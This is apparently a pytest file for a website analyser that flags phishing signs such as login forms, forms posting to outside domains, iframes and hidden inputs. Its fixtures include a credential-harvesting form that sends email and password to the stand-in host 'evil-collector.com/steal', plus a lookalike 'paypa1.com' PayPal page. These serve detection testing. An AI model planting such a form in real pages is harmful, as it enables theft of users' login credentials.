"""
HTML / website analysis tests — V3.
"""

import pytest
from app.analyzers.website import analyse_website_html


class TestHTMLAnalyser:

    def test_login_form_detected(self):
        html = """
        <html><body>
        <form action="/login" method="post">
            <input type="email" name="email"/>
            <input type="password" name="password"/>
            <input type="submit" value="Log in"/>
        </form>
        </body></html>
        """
        result = analyse_website_html(html, "https://example.com/login")
        assert result["has_login_form"] is True
        assert result["has_password_field"] is True
        assert result["has_email_field"] is True

    def test_normal_page_no_login(self):
        html = """
        <html><body>
        <h1>Welcome to our website</h1>
        <p>No login here.</p>
        </body></html>
        """
        result = analyse_website_html(html, "https://example.com/")
        assert result["has_login_form"] is False
        assert result["has_password_field"] is False

    def test_external_form_action_detected(self):
        html = """
        <html><body>
        <form action="https://evil-collector.com/steal" method="post">
            <input type="email" name="email"/>
            <input type="password" name="pass"/>
        </form>
        </body></html>
        """
        result = analyse_website_html(html, "https://victim.com/")
        assert result["has_external_form_action"] is True
        assert "evil-collector.com" in result["external_form_domains"]
        # Should produce a critical signal
        ids = [s["id"] for s in result["signals"]]
        assert "login_form_external_action" in ids

    def test_iframe_detected(self):
        html = """
        <html><body>
        <iframe src="https://tracker.evil.com/frame"></iframe>
        </body></html>
        """
        result = analyse_website_html(html, "https://example.com/")
        assert result["has_iframe"] is True

    def test_hidden_inputs_detected(self):
        html = """
        <html><body>
        <form action="/submit">
            <input type="hidden" name="token" value="abc123"/>
            <input type="text" name="name"/>
        </form>
        </body></html>
        """
        result = analyse_website_html(html, "https://example.com/")
        assert result["has_hidden_inputs"] is True

    def test_title_extracted(self):
        html = """
        <html>
        <head><title>PayPal - Log In</title></head>
        <body><p>test</p></body>
        </html>
        """
        result = analyse_website_html(html, "https://paypa1.com/")
        assert "PayPal" in result["title"]

    def test_empty_html(self):
        result = analyse_website_html("", "https://example.com/")
        assert result["has_login_form"] is False
        assert result["form_count"] == 0

    def test_same_domain_form_action_not_external(self):
        html = """
        <html><body>
        <form action="https://example.com/do-login" method="post">
            <input type="password" name="pass"/>
        </form>
        </body></html>
        """
        result = analyse_website_html(html, "https://example.com/login")
        assert result["has_external_form_action"] is False
